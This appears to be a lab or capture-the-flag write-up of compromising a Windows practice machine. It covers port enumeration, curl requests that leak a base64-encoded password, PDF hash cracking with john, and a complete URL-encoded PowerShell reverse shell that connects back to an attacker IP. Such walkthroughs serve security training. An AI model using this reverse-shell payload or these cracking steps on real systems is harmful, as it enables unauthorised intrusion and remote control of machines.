#Pwned! 
```IP
192.168.242.99
```
# Enumeration
## FTP
FileZilla Server 0.9.60 beta
brute not working
## SMB
guest and blank not working
## RPC
blank nothing
## SNMP
snmpwalk nothing
## HTTP 80
doesnt work apparently

## HTTP 8089
ffuf big.txt nothing

## HTTP 33333
ffuf big.txt nothing
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241209164529.png?raw=true)

# Exploitation

http 8089 request/response
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241209165628.png?raw=true)

IP harcoded. Lets try the same request with target IP
```
curl -i 192.168.164.99:33333/list-running-procs -v
```
```
curl -i 192.168.164.99:33333/list-running-procs -v -X POST
```
```
curl -i 192.168.164.99:33333/list-running-procs -v -X POST -H 'Content-Length: 0'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210094000.png?raw=true)

```
echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d
```
```
NowiseSloopTheory139
```
```
ariah
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210094421.png?raw=true)
# PrivEsc

## Manual
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
cmdkey /list
%SystemRoot%\system32\shell32.dll

we see a ftp directory in / so we get via FTP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101346.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101359.png?raw=true)
```
pdf2john Infrastructure.pdf > pdf.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101956.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210101942.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210103111.png?raw=true)
We now execute a reverse shell:
```
{% raw %}
http://192.168.164.99/?$LHOST%20=%20%22192.168.45.189%22;%20$LPORT%20=%209001;%20$TCPClient%20=%20New-Object%20Net.Sockets.TCPClient($LHOST,%20$LPORT);%20$NetworkStream%20=%20$TCPClient.GetStream();%20$StreamReader%20=%20New-Object%20IO.StreamReader($NetworkStream);%20$StreamWriter%20=%20New-Object%20IO.StreamWriter($NetworkStream);%20$StreamWriter.AutoFlush%20=%20$true;%20$Buffer%20=%20New-Object%20System.Byte[]%201024;%20while%20($TCPClient.Connected)%20{%20while%20($NetworkStream.DataAvailable)%20{%20$RawData%20=%20$NetworkStream.Read($Buffer,%200,%20$Buffer.Length);%20$Code%20=%20([text.encoding]::UTF8).GetString($Buffer,%200,%20$RawData%20-1)%20};%20if%20($TCPClient.Connected%20-and%20$Code.Length%20-gt%201)%20{%20$Output%20=%20try%20{%20Invoke-Expression%20($Code)%202%3E&1%20}%20catch%20{%20$_%20};%20$StreamWriter.Write(%22$Output`n%22);%20$Code%20=%20$null%20}%20};%20$TCPClient.Close();%20$NetworkStream.Close();%20$StreamReader.Close();%20$StreamWriter.Close()
{% endraw %}
```


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210104644.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

